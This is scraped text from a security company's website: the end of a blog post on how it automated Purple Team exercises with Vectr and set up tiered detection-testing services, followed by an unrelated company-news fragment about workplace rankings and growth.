involved us implementing the procedures for test cases and executing them manually. Initially, this meant we had hands-on keyboard testing performed over multiple days. This system worked, and we got the job done, but we quickly realised that executing test cases manually like this was far too time-consuming and redundant. Additionally, manually logging all our actions was a huge pain point, and one of our talented team members ended up with the unfortunate role of secretary for an entire test. We also saw that there was no reason that many of the one-liners we executed could not be automated.Now, this is something we should have solved sooner. We tried addressing the \"secretary\" issue by more rigorously planning every test we were to execute. However, more was needed, as transferring what we typed on the keyboard to an Excel sheet or similar still involved too much overhead. We, therefore, started gradually using Vectr, but without automating any of the execution. That means we used it to \"start\" and \"stop\" exercises, which gives them a best-effort timestamp and log entry. This system also worked, but it did not sufficiently alleviate our issues, as this lacked precision and was prone to human error, e.g. \"Did I press play before I ran that command?\"Now, at this point, we discovered that Vectr had an \"\", which enabled us to start automating test cases and entire campaigns. In short, it allows you to define a set of commands for each test case and build a binary or script that contains all the test cases you want to execute. Run the executable on the target machine, which outputs a log file imported into Vectr. This file then populates the time stamps for each test case and marks them as \"Completed\" by the Red Team.This style of Purple Team testing solved nearly all our challenges with time-consuming planning and execution, as this was now largely automated. The accuracy significantly improved as timestamps were synced with the action executed, and the source and destination were largely prepopulated and easily trackable. We also discovered at this point that we got a ton of automation for free from , as it imports its implementations of attack techniques directly into the automation engine Vectr. Finally, the built-in reporting features of Vectr mean we are shaving hours of reporting and still producing much better reporting and tracking of results than we would have ever been able to do in Excel.While this sounds fantastic, work still needs to be done. We still design many custom campaigns and test cases, but we now have a system we trust and think will last. Now, we spend a few days preparing an exercise instead of spending the same time onsite sitting in front of a keyboard testing. We're no longer holding up valuable IT security people for days, which has allowed us to scale the service and lower the entry barrier for the organisations we work with in a way we did not anticipate six months ago. So not only do we love and embrace automation wherever we can apply it, but in this case, it was necessary to continue delivering Purple Team exercises at scale to our customers.By now, we've delivered multiple Purple Team exercises that have proven effective in advancing organisations' defences. Our Purple Team services help improve security detection controls and enhance response procedures and threat detection strategies. We're pleased with the organic growth of the service from just a general idea to something significant and easily approachable. We've learned a lot along the way and invested considerable time into professionalising Purple Team exercises to deliver them at scale to our customers. Here are some of the changes we are making right now:We are ready to start delivering Continuous Purple Team testing, which allows organisations to identify and improve detection and response in real time and track progress over time. To support a continuous offering like this, we are launching a new tiered model for delivering well-researched and developed packages for Purple Team testing.The first level will be called \"Baseline security detection\", and it will offer a starting point for evaluating existing detection capabilities and getting quick win improvements in areas such as endpoints, Active Directory and networks.The second level, \"Comprehensive security detection\", supports more complex options to improve detection and response, including a ransomware readiness assessment. In the third level, \"Advanced security detection\", we will introduce tailored exercises like APT simulations and sector-oriented tests based on our threat intelligence.The mnemonic Purple Team platform provides a visual overview of the planning, execution, reporting and tracking of these deliveries over time. Automation enables us to repeat exercises easily, show organisations how easy it is to start with Purple Team, and rapidly improve their detection and response.As discussed in this blog post, integrating the Blue Team is critical to a successful Purple Team exercise. mnemonic is in a unique position where we often end up being both the Red and Blue Team on behalf of our customers. We deliver Purple Team as a Red Team-driven service with our Technical Risk Services (TRS) department. However, we're now gradually involving several of our other discipline areas in different ways, through for instane developing threat intelligence-based test cases and scenarios, building resilient detection and response procedures, improving and creating detailed detection signatures, providing strategic recommendations around detection and response in the context of business risk, and integrating our Argus platform and our MDR services with our Purple Team exercises.In addition to everyone involved, we are integrating our 24/7 threat detection and response service , with Purple Team. This combination has proven to be a success. We continuously improve the MDR service by conducting Purple Team exercises in mnemonic with MDR as the core detection mechanism. This approach benefits our customers and ourselves, making us all more resilient to attacks. Overall, this makes Purple Team and MDR a winning combination.Read our check out our  or contact us for a live demo.", "url": "https://www.mnemonic.io/resources/blog/lessons-learned-from-a-year-of-delivering-purple-team-exercises/", "category": "resources", "subcategory": "blog"},

This is a significant improvement from Earlier this year,  in GPTW’s ranking of the best Norwegian workplaces in the category 50-199 employees.mnemonic’s CEO, Tønnes Ingebrigtsen, then stated this about the year that’s past:“We have a lot to be proud of! When a company increases its number of employees by over 25%, enters new geographical locations and seeks structural change, you will always expect certain growing pains. We were well-prepared for this, and we have worked actively to ensure that this does not weaken our historically good culture. Instead, we have become even stronger! Therefore, we’re especially proud of our ranking this year.”During the past year, mnemonic has hired more than 40 security experts, which has led to the company growing out of its office of over 12 years in Oslo. Furthermore, in 2018, mnemonic has changed and strengthened its ownership structure by opening up for all employees to be a part of the ownership of the company, and entering a partnership with the Norwegian investment-company Ferd. mnemonic also opened its first office outside the Nordics, at Canary Wharf in London. Do you want to join the mnemonic team?
